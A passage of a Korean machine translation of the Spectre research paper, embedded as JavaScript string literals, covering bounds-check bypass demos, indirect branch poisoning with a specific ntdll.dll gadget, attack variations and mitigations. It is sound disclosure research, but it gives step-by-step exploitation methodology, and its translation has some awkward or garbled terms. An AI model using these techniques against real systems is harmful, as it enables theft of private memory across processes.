      '실험은 Intel Ivy Bridge(i7-3630QM), Intel Haswell(i7-4650U), Intel Skylake(Unspecified Xeon on Google Cloud), AMD Ryzen을 포함한 다수의 x86 프로세서 아키텍처에 대해 수행되었다. 이러한 모든 CPU에서 Spectre 취약성이 관찰되었다. 32비트 및 64비트 모드와 Linux 및 Windows 모두에서 유사한 결과가 관찰되었다. 일부 ARM 프로세서는 또한 추측 실행을 지원하며 [2] 초기 테스트에서 ARM 프로세서도 영향을 받는 것으로 확인되었다.\n' +
      '\n' +
      '투기 실행은 메인 프로세서보다 훨씬 앞서 진행될 수 있다. 예를 들어 대부분의 테스트에 사용 되는 i7 표면 Pro 3 (i7-4650U)에서 부록 A의 코드는 \'if\' 문과 array1/array2에 액세스 하는 줄 사이에 소스 코드에 삽입 된 최대 188 개의 간단한 명령으로 작동 합니다.\n' +
      '\n' +
      '### C 예제 구현\n' +
      '\n' +
      '부록 A는 x86 프로세서를 위한 C에 데모 코드를 포함한다.\n' +
      '\n' +
      '이 코드에서 victim_function()의 컴파일된 명령어가 엄격한 프로그램 순서로 실행되면, array1_size \\(=16\\)이므로 array1[\\(0..15\\)]에서만 함수가 읽힌다. 그러나 추측적으로 실행될 때 경계 밖 읽기가 가능하다.\n' +
      '\n' +
      'read_memory_byte() 함수는, 분기 예측기가 x에 대한 유효한 값들을 기대하게 하기 위해 victim_function()에 대한 여러 트레이닝 호출들을 행하고, 그 다음, 아웃 바운드 x를 갖는 호출들을 행한다. 조건부 분기 오예측 및 후속하는 추측 실행은 아웃바운드 x를 사용하여 비밀 바이트를 읽는다. 그런 다음 추측 코드는 array2[array1[x] * 512에서 읽어서 array1[x] 값을 캐시 상태로 새깁니다.\n' +
      '\n' +
      '공격을 완료하기 위해 간단한 플러시+프로브를 사용하여 array2의 어떤 캐시 라인이 로드되었는지 식별하여 메모리 내용을 드러낸다. 공격은 여러 번 반복되므로, 타겟 바이트가 처음에 캐시되지 않았더라도, 첫 번째 반복은 그것을 캐시에 가져올 것이다.\n' +
      '\n' +
      '부록 A의 최적화되지 않은 코드는 i7 표면 프로 3에서 약 10KB/초를 읽는다.\n' +
      '\n' +
      '### JavaScript 예제 구현\n' +
      '\n' +
      '개념 증명으로서, JavaScript 코드는 Google Chrome 브라우저에서 실행될 때 JavaScript가 실행되는 프로세스로부터 개인 메모리를 판독할 수 있게 하는 것으로 작성되었다(cf. Listing 2). 누설을 수행하기 위해 사용되는 자바스크립트 코드의 부분은 다음과 같고, 여기서 상수 TABLE1_STRIDE \\(=4096\\) 및 TABLE1_BYTES \\(=2^{25}\\):\n' +
      '\n' +
      '분기-예측기 오트레이닝 패스에서, 인덱스는 (비트 연산을 통해) 범위 내 값으로 설정되고, 이어서 최종 반복 인덱스에서 simpleByteArray로의 범위 외 어드레스로 설정된다. 변수 localJunk는 작업이 최적화 되지 않도록 하는 데 사용 되며 "10" 작업은 값이 정수라는 JavaScript 해석기에 최적화 힌트 역할을 합니다.\n' +
      '\n' +
      '다른 최적화된 JavaScript 엔진과 마찬가지로 V8은 JavaScript를 기계 언어로 변환하기 위해 Just-in-Time 컴파일을 수행합니다. 개발 중 JIT 출력의 x86 분해를 얻기 위해 명령줄 도구 D8을 사용했다. 위의 스니펫으로 이어지는 소스 코드의 수동 조정은 단순ByteArray.length 로컬 메모리의 값을 얻기 위해 수행되었다(레지스터에 캐싱되거나 인출하기 위해 여러 명령을 필요로 하는 대신). D8(AT&T 어셈블리 구문을 사용하는)의 결과 분해 출력은 목록 3을 참조하십시오.\n' +
      '\n' +
      'Clflush 명령은 JavaScript에서 액세스할 수 없으므로 큰 배열에서 4096바이트 간격으로 일련의 주소를 읽어서 캐시 플러시를 수행했다. 인텔 프로세서의 메모리 및 캐시 구성으로 인해, 일련의 ~2000개의 읽기(프로세서의 캐시 크기에 따라)는 주소 비트 11-6에서 동일한 값을 갖는 주소에 대해 프로세서의 캐시에서 데이터를 적절하게 축출했다[38].\n' +
      '\n' +
      '유출된 결과는 \\(n\\)0..255에 대한 probeTable[\\(n\\)*4096]의 캐시 상태를 통해 전달되므로 각 시도는 \\(n>256\\)의 값을 사용하여 probeTable[\\(n\\)*4096]에서 일련의 읽기로 구성된 플러싱 패스로 시작된다. 캐시는 어떤 주소를 삭제할지 결정하기 위한 몇 가지 모드가 있는 것으로 보이며, LRU(최소 최근 사용) 모드를 장려하기 위해 두 개의 인덱스를 사용하여 두 번째 인덱스가 첫 번째 주소를 여러 연산으로 추적했다. 길이 매개변수(예: 분해의 [ebp-Oxe0])도 제거해야 합니다. 주소는 알 수 없지만 4096바이트 경계에 비해 64개의 가능한 64바이트 오프셋만 있으므로 64개의 가능성 모두 작동하는 것을 찾으려고 시도했다.\n' +
      '\n' +
      'JavaScript는 rdtscp 명령어에 대 한 액세스를 제공 하지 않으며 Chrome은 성능을 사용 하 여 타이밍 공격을 만류 하기 위해 의도적으로 고해상도 타이머의 정확도를 저하 합니다 ([1]. 그러나 HTML5의 Web Workers 기능은 공유 메모리 위치에 값을 반복적으로 감소시키는 별도의 스레드를 쉽게 만들 수 있다[18, 32]. 이 접근법은 충분한 해상도를 제공하는 고해상도 타이머를 산출했다.\n' +
      '\n' +
      '## 5 Poisoning Indirect Branch\n' +
      '\n' +
      '간접 분기 명령에는 두 개 이상의 가능한 대상 주소로 점프할 수 있는 기능이 있습니다. 예를 들어, x86 명령어들은 레지스터 내의 어드레스("jmp eax"), 메모리 위치 내의 어드레스("jmp [eax]" 또는 "jmp dword ptr [Ox12345678]") 또는 스택으로부터의 어드레스("ret")로 점프할 수 있다. 간접 브랜치는 또한 ARM(예를 들어, "MOV pc, r14"), MIPS(예를 들어, "jr $ra"), RISC-V(예를 들어, "jalr x0,x1,0") 및 다른 프로세서에서 지원된다.\n' +
      '\n' +
      '캐시 미스로 인해 목적지 어드레스의 결정이 지연되고 분기 예측기가 악의적인 목적지로 오인된 경우, 추측 실행은 적대자가 선택한 위치에서 계속될 수 있다. 그 결과, 추측 실행은 적법한 프로그램 실행 동안 결코 발생하지 않을 위치들로 잘못 지시될 수 있다. 추측적 실행이 측정 가능한 부작용을 남길 수 있다면, 이는 공격자에게 매우 강력하며, 예를 들어 공격 가능한 조건부 분기 오예측이 없는 경우에도 피해자 기억을 노출시킨다.\n' +
      '\n' +
      '피해자의 메모리를 읽으려는 공격자가 간접 분기가 발생할 때 두 개의 레지스터(R1 및 R2로 표시됨)에서 값을 제어하는 경우를 고려한다. 이는 일반적인 시나리오입니다. 외부에서 받은 데이터를 조작 하는 함수는 규칙적으로 함수 호출을 수행 하는 반면 레지스터에는 공격자가 제어할 수 있는 값이 포함 됩니다. (종종 이러한 값들은 함수에 의해 무시된다; 레지스터들은 호출된 함수의 초기에 스택 상에 푸시되고 마지막에 복원된다.) CPU가 추측 실행을 희생자에 의해 실행가능한 메모리 내의 명령들로 제한한다고 가정하면, 공격자는 그 추측 실행이 선택된 메모리를 누설할 \'가젯\'을 찾을 필요가 있다. 예를 들어, 이러한 가젯은 R1에 의해 어드레싱된 메모리 위치를 레지스터 R2 상에 추가(또는 XOR, 감산 등)하는 두 개의 명령어들(반드시 인접할 필요는 없음)에 의해 형성될 것이고, 이어서 R2 내의 어드레스에서 메모리에 액세스하는 임의의 명령어에 의해 형성될 것이다. 이 경우, 가젯은 누설될 어드레스에 대해 공격자 제어(R1을 통해)를 제공하고 누설된 메모리가 어떻게 두 번째 명령에 의해 판독되는 어드레스에 매핑되는지에 대해 제어(R2를 통해)를 제공한다. (윈도우에서의 예시적인 구현은 이러한 가젯을 사용하는 예시적인 메모리 판독 프로세스를 보다 상세하게 설명한다.)\n' +
      '\n' +
      '적국에 의해 알려진 또는 제어되는 상태, 적국에 의해 추구되는 정보가 어디에 존재하는지(예를 들어, 레지스터, 스택, 메모리 등), 추측 실행을 제어하는 적국의 능력, 가젯을 형성하기 위해 이용가능한 명령어 시퀀스, 및 추측 동작으로부터 정보를 유출할 수 있는 채널이 무엇인지에 따라, 수많은 다른 착취 시나리오가 가능하다. 예를 들어, 레지스터에서 비밀 값을 반환하는 암호 함수는 공격자가 레지스터에 지정된 어드레스에서 캐시 메모리로 가져오는 명령에서 단순히 추측 실행을 유도할 수 있는 경우 악용될 수 있다. 마찬가지로, 위의 예는 공격자가 두 개의 레지스터(R1 및 R2)를 제어한다고 가정하지만, 공격자는 단일 레지스터, 스택 상의 값 또는 메모리 값에 대한 제어를 일부 가젯에 대해 충분하다.\n' +
      '\n' +
      '여러 가지 측면에서 공격은 올바르게 작성된 소프트웨어가 취약하고 가제트가 지속 시간이 제한되지만 깨끗하게 종료할 필요가 없으며(CPU가 결국 추측 오류를 인식하기 때문에), 가제트는 명시적으로 사용하지 않고 사이드 채널을 통해 데이터를 유출해야 한다는 점을 제외하고는 반환 지향 프로그래밍(ROP)과 유사합니다. 여전히, 추측 실행은 스택으로부터의 판독, 산술 수행, 분기(여러 번 포함), 및 메모리 판독을 포함하는 명령어들의 복잡한 시퀀스들을 수행할 수 있다.\n' +
      '\n' +
      '### Discussion\n' +
      '\n' +
      '주로 Haswell 기반 Surface Pro 3에 대한 테스트는 Intel x86 프로세서의 하나의 하이퍼 스레드에서 실행되는 코드가 다른 하이퍼 스레드에서 동일한 CPU에서 실행되는 코드에 대해 분기 예측기를 오인할 수 있음을 확인했다. Skylake에 대 한 테스트에서는 동일한 vCPU ( Haswell에서도 발생할 수 있음)의 프로세스 간에 분기 이력 오작동을 추가로 표시 했습니다.\n' +
      '\n' +
      '분기 예측기는 점프 이력을 예측된 점프 목적지에 매핑하는 캐시를 유지하므로, 성공적인 오학습은 분기 예측기가 목표 분기로의 피해자의 리드업을 충분히 모방하고, 예측 목적지가 가젯의 가상 주소인 엔트리를 생성하도록 설득해야 한다.\n' +
      '\n' +
      '다음과 같은 몇 가지 관련 하드웨어 및 운영 체제 구현 선택이 관찰되었다:\n' +
      '\n' +
      '* 추측 실행은 분기 대상 주소가 희생 스레드에 의해 실행 가능한 경우에만 관찰되므로 가젯이 희생에 의해 실행 가능한 메모리 영역에 있어야 합니다.\n' +
      '* 여러 Windows 응용 프로그램이 동일한 DLL을 공유 하는 경우 일반적으로 단일 복사본이 로드 되 고 (아래에 설명 된 대로 수정 된 페이지를 제외 하 고) DLL을 사용 하는 모든 프로세스에 대해 동일한 가상 주소에 매핑 됩니다. 매우 간단한 윈도우 응용 프로그램에서도 작업 세트의 실행 가능한 DLL 페이지에는 몇 메가바이트의 실행 코드가 포함되어 있어 가젯을 검색할 수 있는 충분한 공간을 제공한다.\n' +
      '* 이력 일치 및 예측 모두에 대해 분기 예측기는 분기 대상 가상 주소에만 주의를 기울이는 것으로 표시됩니다. 점프를 수행하는 명령의 소스 어드레스, 물리적 어드레스, 타이밍 및 프로세스 ID는 중요하지 않은 것으로 보인다.\n' +
      '* 점프 이력을 추적하고 일치시키는 알고리즘은 가상 주소의 낮은 비트(단순 해시 함수에 의해 추가로 감소됨)만 사용하는 것으로 보입니다. 따라서 공격자는 희생자의 분기 명령을 포함하는 메모리 주소에서 코드를 실행할 수도 없습니다. 상위 비트는 무시되고 비트 15..0은 Win32 또는 Win64에서 ASLR로 무작위화되지 않는 것처럼 보이기 때문에 ASLR도 보상될 수 있다.\n' +
      '* 분기 예측 변수는 불법 대상으로의 점프를 학습 합니다. 공격자의 프로세스에서 예외가 트리거되지만, 이는 쉽게 걸릴 수 있습니다 (예: C++에서 try...catch를 사용). 그런 다음 분기 예측기는 _기타_ 프로세스를 불법 대상으로 보내는 예측을 수행합니다.\n' +
      '* CPU 전반에 걸친 미스트레인 효과는 관찰되지 않았으며, 이는 각 CPU의 분기 예측 변수가 독립적으로 작동함을 시사합니다.\n' +
      '* DLL 코드 및 상수 데이터 영역은 DLL을 사용 하는 모든 프로세스에 의해 읽고 플러시할 수 있으므로 플러시 및 프로브 공격에서 테이블 영역으로 사용하기 편리합니다.\n' +
      '* DLL 영역은 응용 프로그램에 의해 작성 될 수 있습니다. 복사-온-쓰기 메커니즘이 사용되므로, 이러한 수정은 수정을 수행하는 프로세스에서만 볼 수 있다. 그러나, 이것은 분기 예측기 오억제를 단순화하는데, 이는 가젯을 따르는 명령어에 관계없이 오억제 동안 가젯이 깨끗하게 복귀할 수 있게 하기 때문이다.\n' +
      '\n' +
      '테스트가 윈도우 8에서 32비트 애플리케이션을 사용하여 수행되었지만 64비트 모드와 다른 버전의 윈도우 및 리눅스 공유 라이브러리가 유사하게 작동할 가능성이 높다. 커널 모드 테스트는 수행되지 않았지만 이력 매칭에서 주소 절단/해싱과 불법 목적지로의 점프를 통한 훈련성의 조합은 커널 모드에 대한 공격이 가능할 수 있음을 시사한다. 인터럽트 및 인터럽트 리턴과 같은 다른 종류의 점프에 대한 영향도 알려져 있지 않다.\n' +
      '\n' +
      '### Windows 예제 구현\n' +
      '\n' +
      '개념 증명으로서, 랜덤 키를 생성한 다음 Sleep(0)을 호출하는 무한 루프를 수행하고, 파일의 첫 바이트(예를 들어, 헤더로서)를 로딩하고, 윈도우 크립토 함수를 호출하여 (키 \\(||\\) 헤더의 SHA-1 해시를 계산하고, 헤더가 변경될 때마다 해시를 프린트하는 간단한 프로그램이 작성되었다. 이 프로그램이 최적화로 컴파일되면, Sleep()로의 호출은 레지스터 ebx 및 edi 내의 파일 데이터로 이루어진다. 이를 야기하기 위한 특별한 노력은 취해지지 않았다; 위에서 언급된 바와 같이, (어떤 레지스터들에서 어떤 값들이 나타나는지) 특정들은 종종 컴파일러 최적화들에 의해 결정되고 따라서 소스 코드로부터 예측하기 어렵지만, 레지스터들에서 적대적으로 선택된 값들을 갖는 함수 호출들은 공통적이다. 테스트 프로그램에는 공격자를 돕기 위한 메모리 플러싱 작업이나 기타 적응 작업이 포함되지 않았습니다.\n' +
      '\n' +
      '첫 번째 단계는 ebx와 edi에 대한 적대적 제어 값으로 추측적으로 실행될 때 공격자가 선택한 메모리를 피해자 프로세스에서 드러내는 가젯을 식별하는 것이었다. 전술한 바와 같이, 이 가젯은 피해자 프로세스의 작업 세트 내의 실행가능 페이지에 있어야 한다. (윈도우에서는 DLL의 일부 페이지가 주소 공간에 매핑되지만 작업 세트의 일부가 되기 전에 소프트 페이지 폴트가 필요하다.) 모든 응용 프로그램에서 공통적으로 사용되는 작업 세트 페이지를 저장하는 간단한 프로그램이 작성되었다. 그런 다음 이 출력은 잠재적인 가젯을 검색하여 ebx 및 edi(다른 레지스터 쌍뿐만 아니라)에 대해 여러 사용 가능한 옵션을 산출했다. 이들 중, 윈도우 8 및 윈도우 10 둘 다에서 ntdll.dll에 나타나는 다음의 바이트 시퀀스는 (오히려 임의로) 선택되었다\n' +
      '\n' +
      '13 BC 13 BD 13 BE 13\n' +
      '12 17\n' +
      '\n' +
      '실행될 때, 다음의 명령어들에 대응한다:\n' +
      '\n' +
      ' adc edi,dword ptr [ebx+edx+13BE13BDh] adc dl,byte ptr [edi]\n' +
      '\n' +
      '공격자 제어 ebx 및 edi를 사용하여 이 가젯을 추측 실행하면 공격자가 피해자의 메모리를 읽을 수 있습니다. 만약 공격자가 샘플 프로그램에 대한 \\(\\texttt{ebx}=m-\\texttt{0x13BE13BD}-\\texttt{edx}\\), 여기서 \\(\\texttt{edx}=3\\)을 선택한다면, 첫 번째 명령어는 주소 \\(m\\)에서 32비트 값을 읽어 edi에 추가한다. (피해자는 캐리 플래그가 명확하기 때문에 추가 캐리는 추가되지 않는다.) 에디도 공격자에 의해 제어되기 때문에 두 번째 명령어의 추측 실행은 어드레스 \\(m\\)에서 로드된 32비트 값과 공격자가 선택한 에디의 합인 메모리를 판독(캐시로 가져온다)한다. 따라서 공격자는 \\(2^{32}\\)개의 메모리 값을 더 작은 영역에 매핑할 수 있으며, 이를 플러쉬-앤-프로브를 통해 분석하여 메모리 바이트를 해결할 수 있다. 예를 들어, \\(m+2\\)과 \\(m+3\\)의 바이트가 알려진 경우 에디의 값은 기여도를 상쇄하고 두 번째 읽기를 플러시-앤-프로브를 통해 쉽게 탐색할 수 있는 64KB 영역에 매핑할 수 있다.\n' +
      '\n' +
      '분기 오동작을 위해 선택된 작업은 Sleep() 함수의 첫 번째 명령으로 "jmp dword ptr ds:[76AE0078h]"(ASLR로 인해 점프 목적지의 위치와 목적지 자체가 재부팅당 변경됨) 형태의 점프이다. 이 점프 명령은 공격 프로세스가 목적지 주소를 플러시할 수 있는 것처럼 보였기 때문에 선택되었지만(나중에 언급했듯이), 이것은 작동하지 않았다. 또한, 리턴 명령어와 달리, (예를 들어, 스택에 액세스함으로써) 리턴 어드레스를 제거하지 않고 추측 실행을 제한할 수 있는 인접한 동작이 없었다.\n' +
      '\n' +
      '피해자가 가젯을 투기적으로 실행시키기 위해서는 점프 목적지를 포함하는 메모리 위치를 캐싱하지 않고 분기 예측기를 오인하여 가젯에 투기적 실행을 보내야 한다. 이는 다음과 같이 달성되었다:\n' +
      '\n' +
      '* 간단한 포인터 작업을 사용 하 여 Sleep ()의 진입점과 점프의 대상을 유지 하는 메모리 위치에서 간접 점프를 찾습니다.\n' +
      '* RAM에서 ntdll.dll 검색을 수행하여 가젯을 찾았고, 일부 공유 DLL 메모리는 플러시 앤 프로브 탐지를 수행하기 위해 선택되었습니다.\n' +
      '* 분기 예측기 오작동을 준비 하기 위해 점프 대상에 대 한 대상이 포함 된 메모리 페이지를 (복사-온-기입을 통해) 쓰기 가능 하 게 만들고 가젯 주소로 점프 대상을 변경 하도록 수정 했습니다. 동일한 방법을 사용하여 가젯의 위치에 ret 4 명령어를 작성했다. 이러한 변경 내용은 희생자가 볼 수 있는 메모리에는 영향을 주지 않지만(별도의 프로세스에서 실행 중), 공격자의 Sleep에 대한 호출(분기 예측기 오류)이 가젯 주소로 이동한 다음 즉시 반환되도록 합니다.\n' +
      '* 사전 복사-온-쓰기 때문일 수 있습니다.) 퇴거는 JavaScript 예제 _i.e_와 동일한 일반적인 방법을 사용 하 여 큰 테이블을 할당 하 고 한 쌍의 인덱스를 사용 하 여 퇴거 하는 주소의 4096 바이트 배수에서 주소를 읽습니다.\n' +
      '* 분기 예측 변수를 잘못 지정 하기 위해 스레드를 시작 했습니다. 이들은 0xC3 바이트(ret instructions)로 채워진 \\(2^{20}\\) 바이트(1MB) 실행가능한 메모리 영역을 사용한다. 점프 목적지의 피해자의 패턴은 초기 트레이닝 프로세스 동안 발견된 ASLR에 대한 조정과 함께 이 영역의 어드레스에 매핑된다(아래 참조). 오트레이닝 스레드들은 매핑된 어드레스들을 스택 상으로 푸시하는 루프를 실행하여, 개시 리트 명령어가 프로세서로 하여금 메모리 영역에서 일련의 리턴 명령어들을 수행하게 하고, 이어서 가젯 어드레스로 분기하고, 이어서 (거기에 배치된 리트 때문에) 즉시 루프로 리턴한다. 오인식 스레드와 희생자의 하이퍼스레딩을 장려하기 위해, 퇴거 및 프로빙 스레드는 코어(사용중으로 유지됨)를 공유하기 위해 CPU 친화도를 설정하고, 희생자를 남기고 나머지 코어를 공유하기 위해 오인식 스레드를 설정한다.\n' +
      '* 분기 예측기가 잘못 훈련되는 초기 단계에서 희생자가 Sleep()를 호출할 때 \\(\\{\\texttt{ebox}+3h+13BE13BDh\\}\\) 값이 알려진 DLL 위치를 읽고 edi를 선택하여 두 번째 작업이 쉽게 모니터링할 수 있는 다른 위치를 가리키도록 입력을 받습니다. 이러한 설정으로, 분기 트레이닝 시퀀스는 피해자의 ASLR을 보상하도록 조정된다.\n' +
      '* 마지막으로, 일단 효과적인 모방 점프 시퀀스가 발견되면, 공격자는 희생자의 어드레스 공간을 통해 판독하여 ebx 및 edi의 값을 제어하고 위에서 선택된 DLL 영역 상의 플러시-앤-프로브를 사용함으로써 (ASLR로 인해 이동할 수 있는) 값을 찾기 위해 희생자 데이터 영역을 찾고 판독할 수 있다.\n' +
      '\n' +
      '완료된 공격을 통해 희생자 프로세스에서 메모리를 읽을 수 있습니다.\n' +
      '\n' +
      '## 6 Variations\n' +
      '\n' +
      '지금까지 우리는 추측 실행 중에 발생하는 캐시의 상태 변화를 활용하는 공격을 시연했다. 미래 프로세서들(또는 상이한 마이크로코드를 갖는 기존의 프로세서들)은, 예를 들어, 추측적으로 실행된 코드가 캐시 상태를 수정하는 것을 방지하기 위한 조치들이 취해진 경우, 다르게 행동할 수 있다. 이 섹션에서는 추측 실행이 다른 미세 구조 구성 요소의 상태에 어떻게 영향을 미칠 수 있는지 포함하여 공격의 잠재적 변형을 조사한다. 일반적으로 Spectre 공격은 다른 미세 구조 공격과 결합될 수 있다. 이 섹션에서는 잠재적인 조합을 탐색하고 추측적으로 실행되는 코드의 거의 모든 관찰 가능한 효과가 잠재적으로 민감한 정보의 누출로 이어질 수 있다고 결론지었다. 다음 기술들이 테스트된 프로세서들에 대해 필요하지 않지만(그리고 구현되지 않았지만), 완화들을 설계하거나 평가할 때 잠재적인 변동들을 이해하는 것이 필수적이다.\n' +
      '\n' +
      '**Evict+Time.** Evict+Time 공격 [29]는 캐시의 상태에 따라 작업 타이밍을 측정 하 여 작동 합니다. 이 기술은 다음과 같이 Spectre를 사용하도록 적응될 수 있다. 코드를 고려합니다.\n' +
      '\n' +
      'if (false but mispredicts as true)  read array1[R1]  read [R2]\n' +
      '\n' +
      '레지스터 R1에 비밀 값이 포함되어 있다고 가정하자. 어레이1[R1]의 추측적으로 실행된 메모리 판독이 캐시 히트인 경우, 메모리 버스에 아무 것도 걸리지 않고 [R2]로부터의 판독이 신속하게 개시될 것이다. 어레이1[R1]의 판독이 캐시 미스인 경우, 제2 판독은 더 오래 걸리고, 희생 스레드에 대한 상이한 타이밍을 초래할 수 있다. 또한, (다른 프로세서들과 같은) 메모리에 액세스할 수 있는 시스템 내의 다른 컴포넌트들은 메모리 버스 상의 활동의 존재 또는 메모리 판독의 다른 효과들(예를 들어, DRAM 행 어드레스 선택을 변경하는 것)을 가능하게 할 수 있다. 이 공격은 우리가 구현한 공격과 달리 추측 실행이 캐시의 내용을 수정하지 않더라도 작동할 수 있다는 점에 주목한다. 필요한 것은 캐시의 상태가 추측적으로 실행된 코드의 타이밍에 영향을 미치거나 궁극적으로 공격자에게 보이는 일부 다른 속성이다.\n' +
      '\n' +
      '**지침 타이밍.** Spectre 취약성은 반드시 캐시를 포함할 필요는 없습니다. 타이밍이 피연산자들의 값들에 의존하는 명령들은 피연산자들 상의 정보를 누설할 수 있다[8]. 다음 예에서, 곱셈기는 곱셈 R1, R2의 추측적 실행에 의해 점유된다. 곱셈기가 곱셈 R3, R4에 대해 이용가능하게 되는 타이밍(순서가 어긋나는 실행을 위해 또는 잘못된 예측이 인식된 후에)은 첫 번째 곱셈의 타이밍에 의해 영향을 받아 R1 및 R2에 대한 정보를 드러낼 수 있다.\n' +
      '\n' +
      'if(false but mispredicts as true)multiplyR1,R2 multiplyR3,R4\n' +
      '\n' +
      '#### 6.2.3 등록 파일에서 경쟁.\n' +
      '\n' +
      'CPU가 추측 실행을 위한 체크포인트를 저장하는 데 사용할 수 있는 제한된 수의 레지스터를 가진 레지스터 파일을 가지고 있다고 가정하자. 다음 예제에서 두 번째 \'if\'의 R1에 대한 조건이 참인 경우 R1에 대한 조건이 거짓인 경우보다 추가 추측 실행 검사점이 생성됩니다. 만약 적대자가 이 체크포인트를 검출할 수 있다면, 예를 들어, 저장의 부족으로 인해 하이퍼스레드에서 코드의 추측적 실행이 감소된다면, 이것은 R1에 관한 정보를 드러낸다.\n' +
      '\n' +
      ' if (false but mispredicts as true)  if (condition on R1)  if (condition)\n' +
      '\n' +
      '추측 실행의 변형.조건부 분기가 포함되지 않은 코드도 잠재적으로 위험에 처할 수 있습니다. 예를 들어, 공격자가 R1에 공격자가 선택한 값 \\(X\\) 또는 다른 값이 포함되어 있는지 여부를 확인하려는 경우를 고려하십시오. (이러한 결정을 내리는 능력은 일부 암호 구현들을 깨뜨리기에 충분하다.) 공격자는 분기 예측기를 오인식하여, 인터럽트가 발생한 후, 인터럽트가 메모리[R1]를 판독하는 명령으로 오예측하도록 한다. 공격자는 플러시+리로드에 적합한 메모리 주소에 대응하도록 \\(X\\)을 선택하여 R1\\(=X\\) 여부를 드러낸다.\n' +
      '\n' +
      '#### 6.2.4 임의 관찰 가능 효과를 활용\n' +
      '\n' +
      '추측적으로 실행된 코드의 거의 모든 관찰 가능한 효과는 민감한 정보를 유출하는 데 활용될 수 있다.\n' +
      '\n' +
      '배열 1/array2에 대 한 액세스 후 작업이 추측 하 게 실행 될 때 관찰 될 수 있는 목록 1의 예제를 고려 합니다. 이 경우, 관찰 가능한 동작이 시작되는 타이밍은 어레이(2)의 캐시 상태에 의존할 것이다.\n' +
      '\n' +
      ' if (x < array1_size)  y = array2[array1[x] * 256];  // 추측 실행 시 관측 가능한 Y를 사용하여 무엇인가를 수행  }\n' +
      '\n' +
      '## 7 완화 옵션\n' +
      '\n' +
      '잠재적으로 민감한 실행 경로에서 투기 실행을 중단할 수 있는 경우 조건부 분기 취약성이 완화될 수 있습니다. 인텔 x86 프로세서에서 "명령어 직렬화"는 실제로 이를 수행하는 것으로 보이지만, 아키텍처적으로 보장된 동작은 "추측적으로 실행된 명령어의 결과가 폐기되기 때문에 추측 실행을 제한"하는 것이다[4]. 이는 투기적 집행이 발생하지 않도록 하거나 정보를 유출하지 않도록 하는 것과는 차이가 있다. 결과적으로, 직렬화 명령어는 모든 프로세서 또는 시스템 구성에 대한 효과적인 대응책이 아닐 수 있다. 또한 인텔에 의해 나열된 세 가지 사용자 모드 직렬화 명령어 중 일반 코드에서는 cpuid만 사용할 수 있으며 많은 레지스터를 파괴한다. mfence 및 lfence(sfence는 아님) 명령도 작동하는 것으로 보이며, 등록 콘텐츠를 파괴하지 않는다는 추가 이점이 있다. 그러나 추측 실행에 대 한 동작은 정의 되지 않으므로 모든 CPU 또는 시스템 구성에서 작동 하지 않을 수 있습니다. 1 인텔이 아닌 CPU에 대 한 테스트는 수행 되지 않았습니다. 단순한 지연은 이론적으로 작동할 수 있지만, 추측 실행이 캐시 미스를 앞두고 거의 200개의 명령어를 일상적으로 확장하기 때문에 매우 길어야 하며 훨씬 더 먼 거리가 발생할 수 있다.\n' +
      '\n' +
      '각주 1: 본 논문의 초기 초안을 검토한 후, 인텔 엔지니어들은 펜스의 정의가 투기적 실행을 차단하도록 명시하도록 수정될 것이라고 지시했다.\n' +
      '\n' +
      '투기적 실행 차단 명령을 삽입하는 문제는 어렵다. 컴파일러는 이러한 명령들을 포괄적으로 쉽게 삽입할 수 있지만(_i.e._), 이는 각각의 조건부 분기와 그 목적지에 뒤따르는 명령들 모두에서 성능을 심각하게 저하시킬 것이다. 정적 분석 기술은 이러한 검사 중 일부를 제거할 수 있다. 이 취약성은 동일한 프로세스에서 보안이 중요하지 않은 코드를 활용할 수 있기 때문에 보안이 중요한 루틴에만 삽입하는 것만으로는 충분하지 않습니다. 또한, 코드를 재컴파일하여 레거시 애플리케이션에 대한 주요 실제 과제를 제시할 필요가 있다.\n' +
      '\n' +
      '간접 분기 중독은 소프트웨어에서 완화하기가 훨씬 더 어렵다. 컨텍스트 스위치 동안 하이퍼스레딩 및 플러시 분기 예측 상태를 디스에이블하는 것이 가능할 수 있지만, 이를 수행하기 위한 아키텍처적으로 정의된 방법은 없는 것으로 보인다[14]. 이것은 또한 하나의 케이스에 대한 입력이 다른 케이스에서 위험할 수 있는 스위치() 문과 같은 모든 케이스를 다루지 않을 수 있다. (이러한 상황은 인터프리터 및 파서에서 발생할 가능성이 높다.) 또한, 인터럽트 처리에 관련된 것과 같은 다른 형태의 점프에 따른 추측 실행의 적용 가능성 또한 현재 알려지지 않았으며 프로세서마다 다를 가능성이 있다.\n' +
      '\n' +
      '기존 프로세서에 대한 마이크로코드 수정의 실용성도 알려져 있지 않다. 패치가 추측 실행을 비활성화하거나 추측 메모리 읽기를 방지할 수 있지만 이는 상당한 성능 페널티를 초래할 수 있다. 추측 실행이 커밋될 때까지 캐시와 별도로 투기적으로 시작된 메모리 트랜잭션을 버퍼링하는 것은 충분한 대응책이 되지 않는데, 이는 투기 실행의 타이밍도 정보를 드러낼 수 있기 때문이다. 예를 들어, 추측 실행이 메모리 판독에 대한 어드레스를 형성하기 위해 민감한 값을 사용하는 경우, 그 판독의 캐시 상태는 다음 추측 동작의 타이밍에 영향을 미칠 것이다. 예를 들어, 다른 스레드에 의해 사용되는 버스 또는 ALU와 같은 리소스에 영향을 미치기 때문에, 그 동작의 타이밍이 추론될 수 있다면, 메모리는 손상된다. 더 넓게는, 추측 실행이 정보를 누설할 수 있는 다른 방법들이 있기 때문에, 메모리 캐시에 한정되는 잠재적인 대응책들은 불충분할 가능성이 있다. 예를 들어, 메모리 버스 경합, DRAM 행 어드레스 선택 상태, 가상 레지스터들의 가용성, ALU 활동, 및 분기 예측기 자체의 상태로부터의 타이밍 효과들이 고려될 필요가 있다. 물론, 투기적 실행은 전력 및 EM과 같은 종래의 사이드 채널에도 영향을 미칠 것이다.\n' +
      '\n' +
      '결과적으로 소프트웨어 또는 마이크로코드 대응 시도는 추가 연구가 있을 때까지 중단 조치로 간주되어야 한다.\n' +
      '\n' +
      '## 8 결론 및 향후 작업\n' +
      '\n' +
